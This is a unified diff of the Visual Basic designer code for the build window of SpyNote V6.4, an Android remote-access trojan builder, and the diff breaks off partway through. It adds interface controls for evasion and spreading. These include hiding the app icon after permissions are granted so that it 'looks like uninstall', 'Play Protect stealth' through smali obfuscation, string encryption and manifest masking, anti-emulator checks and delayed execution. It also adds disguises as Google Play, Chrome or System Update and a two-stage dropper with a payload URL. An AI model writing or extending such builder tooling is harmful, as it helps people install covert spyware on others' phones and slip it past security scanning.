@@ -1,7 +1,4 @@
-﻿Imports System.Net.Http
-Imports System.Text
-
-<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
 Partial Class Build
     Inherits System.Windows.Forms.Form
 
@@ -18,6 +15,121 @@ Partial Class Build
 
     Private components As System.ComponentModel.IContainer
 
+    Friend WithEvents ThemeTabControl1 As SpyNote_V6._4.SN.ThemeTabControl
+
+    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
+    Friend WithEvents Panel1 As System.Windows.Forms.Panel
+    Friend WithEvents ThemeButton1 As SpyNote_V6._4.SN.ThemeButton
+    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
+    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
+    Friend WithEvents Label1 As System.Windows.Forms.Label
+    Friend WithEvents Panel2 As System.Windows.Forms.Panel
+    Friend WithEvents Label2 As System.Windows.Forms.Label
+    Friend WithEvents Label5 As System.Windows.Forms.Label
+    Friend WithEvents Label4 As System.Windows.Forms.Label
+    Friend WithEvents Label3 As System.Windows.Forms.Label
+    Friend WithEvents TextBox4 As System.Windows.Forms.TextBox
+    Friend WithEvents TextBox3 As System.Windows.Forms.TextBox
+    Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
+    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
+    Friend WithEvents Panel3 As System.Windows.Forms.Panel
+    Friend WithEvents TextBox6 As System.Windows.Forms.TextBox
+    Friend WithEvents Label7 As System.Windows.Forms.Label
+    Friend WithEvents TextBox5 As System.Windows.Forms.TextBox
+    Friend WithEvents Label6 As System.Windows.Forms.Label
+    Friend WithEvents TextBox7 As System.Windows.Forms.TextBox
+    Friend WithEvents Label8 As System.Windows.Forms.Label
+    Friend WithEvents Pi6 As SpyNote_V6._4.SN.PI
+    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
+    Friend WithEvents Panel5 As System.Windows.Forms.Panel
+    Friend WithEvents LED5 As SpyNote_V6._4.SN.LinearLine
+    Friend WithEvents Label12 As System.Windows.Forms.Label
+    Friend WithEvents Label11 As System.Windows.Forms.Label
+    Friend WithEvents Label10 As System.Windows.Forms.Label
+    Friend WithEvents Label9 As System.Windows.Forms.Label
+    Friend WithEvents Label13 As System.Windows.Forms.Label
+    Friend WithEvents LEDDEV As SpyNote_V6._4.SN.ThemeSeparator
+    Friend WithEvents Pi4 As SpyNote_V6._4.SN.PI
+    Friend WithEvents LED4 As SpyNote_V6._4.SN.LinearLine
+    Friend WithEvents LEDACC2 As SpyNote_V6._4.SN.ThemeSeparator
+    Friend WithEvents LED1 As SpyNote_V6._4.SN.LinearLine
+    Friend WithEvents Pi3 As SpyNote_V6._4.SN.PI
+    Friend WithEvents LEDHID As SpyNote_V6._4.SN.ThemeSeparator
+    Friend WithEvents Pi1 As SpyNote_V6._4.SN.PI
+    Friend WithEvents LEDDROOT As SpyNote_V6._4.SN.ThemeSeparator
+    Friend WithEvents Pi5 As SpyNote_V6._4.SN.PI
+    Friend WithEvents LEDACC0 As SpyNote_V6._4.SN.ThemeSeparator
+    Friend WithEvents LED3 As SpyNote_V6._4.SN.LinearLine
+    Friend WithEvents LED2 As SpyNote_V6._4.SN.LinearLine
+    Friend WithEvents Pi2 As SpyNote_V6._4.SN.PI
+    Friend WithEvents PictureBox2 As System.Windows.Forms.PictureBox
+    Friend WithEvents LEDACC1 As SpyNote_V6._4.SN.LinearLine
+    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
+    Friend WithEvents Panel6 As System.Windows.Forms.Panel
+    Friend WithEvents ThemeButton3 As SpyNote_V6._4.SN.ThemeButton
+    Friend WithEvents TextBox8 As System.Windows.Forms.TextBox
+    Friend WithEvents Label15 As System.Windows.Forms.Label
+    Friend WithEvents Label14 As System.Windows.Forms.Label
+    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
+    Friend WithEvents Panel4 As System.Windows.Forms.Panel
+    Friend WithEvents PBil As System.Windows.Forms.PictureBox
+    Friend WithEvents ThemeButton2 As SpyNote_V6._4.SN.ThemeButton
+    Friend WithEvents Trans As System.Windows.Forms.Timer
+
+    ' ----- НОВЫЕ ЭЛЕМЕНТЫ -----
+    Friend WithEvents TabPage6 As System.Windows.Forms.TabPage
+    Friend WithEvents Panel7 As System.Windows.Forms.Panel
+    Friend WithEvents btnTestNotify As SpyNote_V6._4.SN.ThemeButton
+    Friend WithEvents chkEnableNotify As System.Windows.Forms.CheckBox
+    Friend WithEvents cbNotifyType As System.Windows.Forms.ComboBox
+    Friend WithEvents lblNotifyType As System.Windows.Forms.Label
+    Friend WithEvents grpTelegram As System.Windows.Forms.GroupBox
+    Friend WithEvents txtTelegramToken As System.Windows.Forms.TextBox
+    Friend WithEvents lblTelegramToken As System.Windows.Forms.Label
+    Friend WithEvents txtTelegramChatId As System.Windows.Forms.TextBox
+    Friend WithEvents lblTelegramChatId As System.Windows.Forms.Label
+    Friend WithEvents grpDiscord As System.Windows.Forms.GroupBox
+    Friend WithEvents txtDiscordWebhook As System.Windows.Forms.TextBox
+    Friend WithEvents lblDiscordWebhook As System.Windows.Forms.Label
+
+
+    ' ----- PROTECTION TAB ELEMENTS -----
+    Friend WithEvents TabPage7 As System.Windows.Forms.TabPage
+    Friend WithEvents Panel8 As System.Windows.Forms.Panel
+    Friend WithEvents grpProtectionOptions As System.Windows.Forms.GroupBox
+    Friend WithEvents chkEnableProtection As System.Windows.Forms.CheckBox
+    Friend WithEvents txtPackageName As System.Windows.Forms.TextBox
+    Friend WithEvents lblPackageName As System.Windows.Forms.Label
+    Friend WithEvents cbMaskType As System.Windows.Forms.ComboBox
+    Friend WithEvents lblMaskType As System.Windows.Forms.Label
+    Friend WithEvents txtFakeActivity As System.Windows.Forms.TextBox
+    Friend WithEvents lblFakeActivity As System.Windows.Forms.Label
+    Friend WithEvents chkAntiEmulator As System.Windows.Forms.CheckBox
+    Friend WithEvents btnGeneratePackage As SpyNote_V6._4.SN.ThemeButton
+    Friend WithEvents chkHideIconAfterSetup As System.Windows.Forms.CheckBox
+    Friend WithEvents chkStealthEnabled As System.Windows.Forms.CheckBox
+    Friend WithEvents chkObfuscateSmali As System.Windows.Forms.CheckBox
+    Friend WithEvents chkEncryptStrings As System.Windows.Forms.CheckBox
+    Friend WithEvents chkMaskManifest As System.Windows.Forms.CheckBox
+    Friend WithEvents chkDelayedExecution As System.Windows.Forms.CheckBox
+    Friend WithEvents lblDelayOptions As System.Windows.Forms.Label
+    Friend WithEvents numDelayMinutes As System.Windows.Forms.NumericUpDown
+
+    Friend WithEvents TabPageDropper As System.Windows.Forms.TabPage
+    Friend WithEvents PanelDropper As System.Windows.Forms.Panel
+    Friend WithEvents grpDropper_Dropper As System.Windows.Forms.GroupBox
+    Friend WithEvents chkDropperMode_Dropper As System.Windows.Forms.CheckBox
+    Friend WithEvents lblDropperStyle As System.Windows.Forms.Label
+    Friend WithEvents cbDropperStyle As System.Windows.Forms.ComboBox
+    Friend WithEvents lblDropperTemplate As System.Windows.Forms.Label
+    Friend WithEvents txtDropperTemplatePath As System.Windows.Forms.TextBox
+    Friend WithEvents btnBrowseDropperTemplate As System.Windows.Forms.Button
+    Friend WithEvents lblPayloadUrl As System.Windows.Forms.Label
+    Friend WithEvents txtPayloadUrl As System.Windows.Forms.TextBox
+    Friend WithEvents chkEmbedPayload As System.Windows.Forms.CheckBox
+    Friend WithEvents lblDropperHint As System.Windows.Forms.Label
+
+    <System.Diagnostics.DebuggerStepThrough()>
     Private Sub InitializeComponent()
         Me.components = New System.ComponentModel.Container()
         Me.Trans = New System.Windows.Forms.Timer(Me.components)
@@ -48,7 +160,27 @@ Partial Class Build
         Me.lblFakeActivity = New System.Windows.Forms.Label()
         Me.txtFakeActivity = New System.Windows.Forms.TextBox()
         Me.chkAntiEmulator = New System.Windows.Forms.CheckBox()
-        Me.chkDropperMode = New System.Windows.Forms.CheckBox()
+        Me.chkHideIconAfterSetup = New System.Windows.Forms.CheckBox()
+        Me.chkStealthEnabled = New System.Windows.Forms.CheckBox()
+        Me.chkObfuscateSmali = New System.Windows.Forms.CheckBox()
+        Me.chkEncryptStrings = New System.Windows.Forms.CheckBox()
+        Me.chkMaskManifest = New System.Windows.Forms.CheckBox()
+        Me.chkDelayedExecution = New System.Windows.Forms.CheckBox()
+        Me.lblDelayOptions = New System.Windows.Forms.Label()
+        Me.numDelayMinutes = New System.Windows.Forms.NumericUpDown()
+        Me.TabPageDropper = New System.Windows.Forms.TabPage()
+        Me.PanelDropper = New System.Windows.Forms.Panel()
+        Me.grpDropper_Dropper = New System.Windows.Forms.GroupBox()
+        Me.chkDropperMode_Dropper = New System.Windows.Forms.CheckBox()
+        Me.lblDropperStyle = New System.Windows.Forms.Label()
+        Me.cbDropperStyle = New System.Windows.Forms.ComboBox()
+        Me.lblDropperTemplate = New System.Windows.Forms.Label()
+        Me.txtDropperTemplatePath = New System.Windows.Forms.TextBox()
+        Me.btnBrowseDropperTemplate = New System.Windows.Forms.Button()
+        Me.lblPayloadUrl = New System.Windows.Forms.Label()
+        Me.txtPayloadUrl = New System.Windows.Forms.TextBox()
+        Me.chkEmbedPayload = New System.Windows.Forms.CheckBox()
+        Me.lblDropperHint = New System.Windows.Forms.Label()
         Me.TabPage1 = New System.Windows.Forms.TabPage()
         Me.Panel2 = New System.Windows.Forms.Panel()
         Me.TextBox4 = New System.Windows.Forms.TextBox()
@@ -114,6 +246,10 @@ Partial Class Build
         Me.TabPage7.SuspendLayout()
         Me.Panel8.SuspendLayout()
         Me.grpProtectionOptions.SuspendLayout()
+        CType(Me.numDelayMinutes, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.TabPageDropper.SuspendLayout()
+        Me.PanelDropper.SuspendLayout()
+        Me.grpDropper_Dropper.SuspendLayout()
         Me.TabPage1.SuspendLayout()
         Me.Panel2.SuspendLayout()
         Me.Panel1.SuspendLayout()
@@ -145,23 +281,24 @@ Partial Class Build
         Me.ThemeTabControl1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
             Or System.Windows.Forms.AnchorStyles.Left) _
             Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
-        Me.ThemeTabControl1.BorderColor_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
+        Me.ThemeTabControl1.BorderColor_S = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.ThemeTabControl1.Controls.Add(Me.TabPage6)
         Me.ThemeTabControl1.Controls.Add(Me.TabPage7)
+        Me.ThemeTabControl1.Controls.Add(Me.TabPageDropper)
         Me.ThemeTabControl1.Controls.Add(Me.TabPage1)
         Me.ThemeTabControl1.Controls.Add(Me.TabPage2)
         Me.ThemeTabControl1.Controls.Add(Me.TabPage4)
         Me.ThemeTabControl1.Controls.Add(Me.TabPage5)
         Me.ThemeTabControl1.Controls.Add(Me.TabPage3)
-        Me.ThemeTabControl1.DefaultBackColor_S = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
+        Me.ThemeTabControl1.DefaultBackColor_S = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.ThemeTabControl1.DefaultColor0_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
         Me.ThemeTabControl1.DefaultColor1_S = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
         Me.ThemeTabControl1.DefaultForColor_S = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
         Me.ThemeTabControl1.FForColorSelcted_S = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
         Me.ThemeTabControl1.ItemSize = New System.Drawing.Size(25, 25)
         Me.ThemeTabControl1.Location = New System.Drawing.Point(3, 0)
-        Me.ThemeTabControl1.MouseOver0_S = System.Drawing.Color.FromArgb(CType(CType(32, Byte), Integer), CType(CType(146, Byte), Integer), CType(CType(255, Byte), Integer))
-        Me.ThemeTabControl1.MouseOver1_S = System.Drawing.Color.FromArgb(CType(CType(32, Byte), Integer), CType(CType(146, Byte), Integer), CType(CType(255, Byte), Integer))
+        Me.ThemeTabControl1.MouseOver0_S = System.Drawing.Color.Maroon
+        Me.ThemeTabControl1.MouseOver1_S = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.ThemeTabControl1.Multiline = True
         Me.ThemeTabControl1.Name = "ThemeTabControl1"
         Me.ThemeTabControl1.SelectedIndex = 0
@@ -170,7 +307,7 @@ Partial Class Build
         '
         'TabPage6
         '
-        Me.TabPage6.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
+        Me.TabPage6.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.TabPage6.Controls.Add(Me.Panel7)
         Me.TabPage6.Location = New System.Drawing.Point(4, 54)
         Me.TabPage6.Name = "TabPage6"
@@ -360,16 +497,18 @@ Partial Class Build
         'Panel8
         '
         Me.Panel8.AutoScroll = True
+        Me.Panel8.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.Panel8.Controls.Add(Me.grpProtectionOptions)
         Me.Panel8.Dock = System.Windows.Forms.DockStyle.Fill
-        Me.Panel8.Location = New System.Drawing.Point(6, 6)
+        Me.Panel8.Location = New System.Drawing.Point(0, 0)
         Me.Panel8.Name = "Panel8"
         Me.Panel8.Padding = New System.Windows.Forms.Padding(0, 0, 0, 8)
-        Me.Panel8.Size = New System.Drawing.Size(467, 386)
+        Me.Panel8.Size = New System.Drawing.Size(479, 398)
         Me.Panel8.TabIndex = 0
         '
         'grpProtectionOptions
         '
+        Me.grpProtectionOptions.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.grpProtectionOptions.Controls.Add(Me.chkEnableProtection)
         Me.grpProtectionOptions.Controls.Add(Me.lblPackageName)
         Me.grpProtectionOptions.Controls.Add(Me.txtPackageName)
@@ -379,11 +518,18 @@ Partial Class Build
         Me.grpProtectionOptions.Controls.Add(Me.lblFakeActivity)
         Me.grpProtectionOptions.Controls.Add(Me.txtFakeActivity)
         Me.grpProtectionOptions.Controls.Add(Me.chkAntiEmulator)
-        Me.grpProtectionOptions.Controls.Add(Me.chkDropperMode)
+        Me.grpProtectionOptions.Controls.Add(Me.chkHideIconAfterSetup)
+        Me.grpProtectionOptions.Controls.Add(Me.chkStealthEnabled)
+        Me.grpProtectionOptions.Controls.Add(Me.chkObfuscateSmali)
+        Me.grpProtectionOptions.Controls.Add(Me.chkEncryptStrings)
+        Me.grpProtectionOptions.Controls.Add(Me.chkMaskManifest)
+        Me.grpProtectionOptions.Controls.Add(Me.chkDelayedExecution)
+        Me.grpProtectionOptions.Controls.Add(Me.lblDelayOptions)
+        Me.grpProtectionOptions.Controls.Add(Me.numDelayMinutes)
         Me.grpProtectionOptions.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
-        Me.grpProtectionOptions.Location = New System.Drawing.Point(15, 10)
+        Me.grpProtectionOptions.Location = New System.Drawing.Point(19, 0)
         Me.grpProtectionOptions.Name = "grpProtectionOptions"
-        Me.grpProtectionOptions.Size = New System.Drawing.Size(420, 300)
+        Me.grpProtectionOptions.Size = New System.Drawing.Size(420, 410)
         Me.grpProtectionOptions.TabIndex = 0
         Me.grpProtectionOptions.TabStop = False
         Me.grpProtectionOptions.Text = "Protection Options"
@@ -459,7 +605,7 @@ Partial Class Build
         Me.cbMaskType.BackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
         Me.cbMaskType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
         Me.cbMaskType.FlatStyle = System.Windows.Forms.FlatStyle.Flat
-        Me.cbMaskType.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
+        Me.cbMaskType.ForeColor = System.Drawing.Color.DarkRed
         Me.cbMaskType.Items.AddRange(New Object() {"Google Play", "Chrome", "Settings", "Game"})
         Me.cbMaskType.Location = New System.Drawing.Point(20, 123)
         Me.cbMaskType.Name = "cbMaskType"
@@ -488,26 +634,255 @@ Partial Class Build
         'chkAntiEmulator
         '
         Me.chkAntiEmulator.AutoSize = True
-        Me.chkAntiEmulator.Location = New System.Drawing.Point(20, 170)
+        Me.chkAntiEmulator.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
+        Me.chkAntiEmulator.Location = New System.Drawing.Point(20, 198)
         Me.chkAntiEmulator.Name = "chkAntiEmulator"
         Me.chkAntiEmulator.Size = New System.Drawing.Size(145, 18)
         Me.chkAntiEmulator.TabIndex = 9
         Me.chkAntiEmulator.Text = "Anti-emulator checks"
-        Me.chkAntiEmulator.UseVisualStyleBackColor = True
+        Me.chkAntiEmulator.UseVisualStyleBackColor = False
         '
-        'chkDropperMode
+        'chkHideIconAfterSetup
         '
-        Me.chkDropperMode.AutoSize = True
-        Me.chkDropperMode.Location = New System.Drawing.Point(20, 195)
-        Me.chkDropperMode.Name = "chkDropperMode"
-        Me.chkDropperMode.Size = New System.Drawing.Size(106, 18)
-        Me.chkDropperMode.TabIndex = 10
-        Me.chkDropperMode.Text = "Dropper mode"
-        Me.chkDropperMode.UseVisualStyleBackColor = True
+        Me.chkHideIconAfterSetup.AutoSize = True
+        Me.chkHideIconAfterSetup.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
+        Me.chkHideIconAfterSetup.Location = New System.Drawing.Point(20, 220)
+        Me.chkHideIconAfterSetup.Name = "chkHideIconAfterSetup"
+        Me.chkHideIconAfterSetup.Size = New System.Drawing.Size(294, 18)
+        Me.chkHideIconAfterSetup.TabIndex = 11
+        Me.chkHideIconAfterSetup.Text = "Hide icon after permissions (looks like uninstall)"
+        Me.chkHideIconAfterSetup.UseVisualStyleBackColor = False
+        '
+        'chkStealthEnabled
+        '
+        Me.chkStealthEnabled.AutoSize = True
+        Me.chkStealthEnabled.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
+        Me.chkStealthEnabled.Location = New System.Drawing.Point(20, 248)
+        Me.chkStealthEnabled.Name = "chkStealthEnabled"
+        Me.chkStealthEnabled.Size = New System.Drawing.Size(295, 18)
+        Me.chkStealthEnabled.TabIndex = 12
+        Me.chkStealthEnabled.Text = "Play Protect stealth (obfuscate + encrypt + mask)"
+        Me.chkStealthEnabled.UseVisualStyleBackColor = False
+        '
+        'chkObfuscateSmali
+        '
+        Me.chkObfuscateSmali.AutoSize = True
+        Me.chkObfuscateSmali.ForeColor = System.Drawing.Color.White
+        Me.chkObfuscateSmali.Location = New System.Drawing.Point(35, 270)
+        Me.chkObfuscateSmali.Name = "chkObfuscateSmali"
+        Me.chkObfuscateSmali.Size = New System.Drawing.Size(236, 18)
+        Me.chkObfuscateSmali.TabIndex = 13
+        Me.chkObfuscateSmali.Text = "Obfuscate smali (org/spynote -> a/b/C)"
+        Me.chkObfuscateSmali.UseVisualStyleBackColor = False
+        '
+        'chkEncryptStrings
+        '
+        Me.chkEncryptStrings.AutoSize = True
+        Me.chkEncryptStrings.ForeColor = System.Drawing.Color.White
+        Me.chkEncryptStrings.Location = New System.Drawing.Point(35, 290)
+        Me.chkEncryptStrings.Name = "chkEncryptStrings"
+        Me.chkEncryptStrings.Size = New System.Drawing.Size(224, 18)
+        Me.chkEncryptStrings.TabIndex = 14
+        Me.chkEncryptStrings.Text = "Encrypt strings (XOR + dynamic key)"
+        Me.chkEncryptStrings.UseVisualStyleBackColor = False
+        '
+        'chkMaskManifest
+        '
+        Me.chkMaskManifest.AutoSize = True
+        Me.chkMaskManifest.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
+        Me.chkMaskManifest.ForeColor = System.Drawing.Color.White
+        Me.chkMaskManifest.Location = New System.Drawing.Point(35, 310)
+        Me.chkMaskManifest.Name = "chkMaskManifest"
+        Me.chkMaskManifest.Size = New System.Drawing.Size(263, 18)
+        Me.chkMaskManifest.TabIndex = 15
+        Me.chkMaskManifest.Text = "Mask AndroidManifest (support.v7 aliases)"
+        Me.chkMaskManifest.UseVisualStyleBackColor = False
+        '
+        'chkDelayedExecution
+        '
+        Me.chkDelayedExecution.AutoSize = True
+        Me.chkDelayedExecution.ForeColor = System.Drawing.Color.White
+        Me.chkDelayedExecution.Location = New System.Drawing.Point(20, 332)
+        Me.chkDelayedExecution.Name = "chkDelayedExecution"
+        Me.chkDelayedExecution.Size = New System.Drawing.Size(181, 18)
+        Me.chkDelayedExecution.TabIndex = 16
+        Me.chkDelayedExecution.Text = "Delayed execution (optional)"
+        Me.chkDelayedExecution.UseVisualStyleBackColor = False
+        '
+        'lblDelayOptions
+        '
+        Me.lblDelayOptions.AutoSize = True
+        Me.lblDelayOptions.ForeColor = System.Drawing.Color.White
+        Me.lblDelayOptions.Location = New System.Drawing.Point(35, 354)
+        Me.lblDelayOptions.Name = "lblDelayOptions"
+        Me.lblDelayOptions.Size = New System.Drawing.Size(204, 14)
+        Me.lblDelayOptions.TabIndex = 17
+        Me.lblDelayOptions.Text = "Delay min / screen toggles / battery:"
+        '
+        'numDelayMinutes
+        '
+        Me.numDelayMinutes.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
+        Me.numDelayMinutes.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.numDelayMinutes.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
+        Me.numDelayMinutes.Location = New System.Drawing.Point(35, 372)
+        Me.numDelayMinutes.Maximum = New Decimal(New Integer() {1440, 0, 0, 0})
+        Me.numDelayMinutes.Name = "numDelayMinutes"
+        Me.numDelayMinutes.Size = New System.Drawing.Size(60, 20)
+        Me.numDelayMinutes.TabIndex = 18
+        Me.numDelayMinutes.Value = New Decimal(New Integer() {5, 0, 0, 0})
+        '
+        'TabPageDropper
+        '
+        Me.TabPageDropper.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
+        Me.TabPageDropper.Controls.Add(Me.PanelDropper)
+        Me.TabPageDropper.Location = New System.Drawing.Point(4, 54)
+        Me.TabPageDropper.Name = "TabPageDropper"
+        Me.TabPageDropper.Padding = New System.Windows.Forms.Padding(3)
+        Me.TabPageDropper.Size = New System.Drawing.Size(479, 398)
+        Me.TabPageDropper.TabIndex = 7
+        Me.TabPageDropper.Text = "Dropper"
+        '
+        'PanelDropper
+        '
+        Me.PanelDropper.AutoScroll = True
+        Me.PanelDropper.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
+        Me.PanelDropper.Controls.Add(Me.grpDropper_Dropper)
+        Me.PanelDropper.Dock = System.Windows.Forms.DockStyle.Fill
+        Me.PanelDropper.Location = New System.Drawing.Point(3, 3)
+        Me.PanelDropper.Name = "PanelDropper"
+        Me.PanelDropper.Size = New System.Drawing.Size(473, 392)
+        Me.PanelDropper.TabIndex = 0
+        '
+        'grpDropper_Dropper
+        '
+        Me.grpDropper_Dropper.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
+        Me.grpDropper_Dropper.Controls.Add(Me.chkDropperMode_Dropper)
+        Me.grpDropper_Dropper.Controls.Add(Me.lblDropperStyle)
+        Me.grpDropper_Dropper.Controls.Add(Me.cbDropperStyle)
+        Me.grpDropper_Dropper.Controls.Add(Me.lblDropperTemplate)
+        Me.grpDropper_Dropper.Controls.Add(Me.txtDropperTemplatePath)
+        Me.grpDropper_Dropper.Controls.Add(Me.btnBrowseDropperTemplate)
+        Me.grpDropper_Dropper.Controls.Add(Me.lblPayloadUrl)
+        Me.grpDropper_Dropper.Controls.Add(Me.txtPayloadUrl)
+        Me.grpDropper_Dropper.Controls.Add(Me.chkEmbedPayload)
+        Me.grpDropper_Dropper.Controls.Add(Me.lblDropperHint)
+        Me.grpDropper_Dropper.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
+        Me.grpDropper_Dropper.Location = New System.Drawing.Point(10, 10)
+        Me.grpDropper_Dropper.Name = "grpDropper_Dropper"
+        Me.grpDropper_Dropper.Size = New System.Drawing.Size(440, 330)
+        Me.grpDropper_Dropper.TabIndex = 0
+        Me.grpDropper_Dropper.TabStop = False
+        Me.grpDropper_Dropper.Text = "Play Dropper (2-stage install)"
+        '
+        'chkDropperMode_Dropper
+        '
+        Me.chkDropperMode_Dropper.AutoSize = True
+        Me.chkDropperMode_Dropper.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
+        Me.chkDropperMode_Dropper.Location = New System.Drawing.Point(12, 22)
+        Me.chkDropperMode_Dropper.Name = "chkDropperMode_Dropper"
+        Me.chkDropperMode_Dropper.Size = New System.Drawing.Size(213, 18)
+        Me.chkDropperMode_Dropper.TabIndex = 0
+        Me.chkDropperMode_Dropper.Text = "Build Play dropper after client APK"
+        Me.chkDropperMode_Dropper.UseVisualStyleBackColor = False
+        '
+        'lblDropperStyle
+        '
+        Me.lblDropperStyle.AutoSize = True
+        Me.lblDropperStyle.Location = New System.Drawing.Point(12, 52)
+        Me.lblDropperStyle.Name = "lblDropperStyle"
+        Me.lblDropperStyle.Size = New System.Drawing.Size(82, 14)
+        Me.lblDropperStyle.TabIndex = 1
+        Me.lblDropperStyle.Text = "Dropper skin:"
+        '
+        'cbDropperStyle
+        '
+        Me.cbDropperStyle.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
+        Me.cbDropperStyle.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
+        Me.cbDropperStyle.ForeColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
+        Me.cbDropperStyle.FormattingEnabled = True
+        Me.cbDropperStyle.Items.AddRange(New Object() {"Google Play", "Chrome", "System Update", "Settings"})
+        Me.cbDropperStyle.Location = New System.Drawing.Point(140, 46)
+        Me.cbDropperStyle.Name = "cbDropperStyle"
+        Me.cbDropperStyle.Size = New System.Drawing.Size(200, 22)
+        Me.cbDropperStyle.TabIndex = 2
+        '
+        'lblDropperTemplate
+        '
+        Me.lblDropperTemplate.AutoSize = True
+        Me.lblDropperTemplate.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
+        Me.lblDropperTemplate.Location = New System.Drawing.Point(6, 81)
+        Me.lblDropperTemplate.Name = "lblDropperTemplate"
+        Me.lblDropperTemplate.Size = New System.Drawing.Size(131, 14)
+        Me.lblDropperTemplate.TabIndex = 3
+        Me.lblDropperTemplate.Text = "Custom template APK:"
+        '
+        'txtDropperTemplatePath
+        '
+        Me.txtDropperTemplatePath.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
+        Me.txtDropperTemplatePath.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.txtDropperTemplatePath.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
+        Me.txtDropperTemplatePath.Location = New System.Drawing.Point(140, 79)
+        Me.txtDropperTemplatePath.Name = "txtDropperTemplatePath"
+        Me.txtDropperTemplatePath.Size = New System.Drawing.Size(204, 20)
+        Me.txtDropperTemplatePath.TabIndex = 4
+        '
+        'btnBrowseDropperTemplate
+        '
+        Me.btnBrowseDropperTemplate.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
+        Me.btnBrowseDropperTemplate.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.btnBrowseDropperTemplate.ForeColor = System.Drawing.Color.Maroon
+        Me.btnBrowseDropperTemplate.Location = New System.Drawing.Point(350, 76)
